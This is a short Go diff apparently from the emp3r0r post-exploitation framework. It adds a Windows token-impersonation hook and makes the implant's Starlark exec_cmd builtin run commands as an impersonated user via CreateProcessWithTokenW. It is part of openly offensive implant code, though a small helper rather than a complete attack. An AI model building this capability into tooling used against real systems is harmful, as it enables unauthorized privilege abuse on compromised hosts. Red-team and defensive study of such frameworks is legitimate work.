@@ -5,10 +5,19 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"go.starlark.net/starlark"
 )
+
+// ExecWithToken is an optional hook that, when set on Windows, uses
+// CreateProcessWithTokenW so the child process runs under the impersonation
+// token instead of the primary process token.
+//
+// token is the raw HANDLE cast to uintptr; commandLine is the full command
+// line (including arguments) to execute.
+var ExecWithToken func(token uintptr, commandLine string) error
 
 func starlarkReadFile(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
 	var path string
@@ -136,6 +145,22 @@ func starlarkExecCmd(thread *starlark.Thread, fn *starlark.Builtin, args starlar
 			goArgs = append(goArgs, s)
 		}
 	}
+
+	// If a token is set (ExecuteAsToken is active), use CreateProcessWithTokenW
+	// so the child process runs as the impersonated user.
+	if tokenVal := thread.Local("token"); tokenVal != nil {
+		if token, ok := tokenVal.(uintptr); ok && token != 0 && ExecWithToken != nil {
+			cmdLine := command
+			if len(goArgs) > 0 {
+				cmdLine += " " + strings.Join(goArgs, " ")
+			}
+			if err := ExecWithToken(token, cmdLine); err != nil {
+				return starlark.None, fmt.Errorf("exec_cmd with token: %w", err)
+			}
+			return starlark.String("started (token)"), nil
+		}
+	}
+
 	c := exec.Command(command, goArgs...)
 	out, err := c.CombinedOutput()
 	if err != nil {
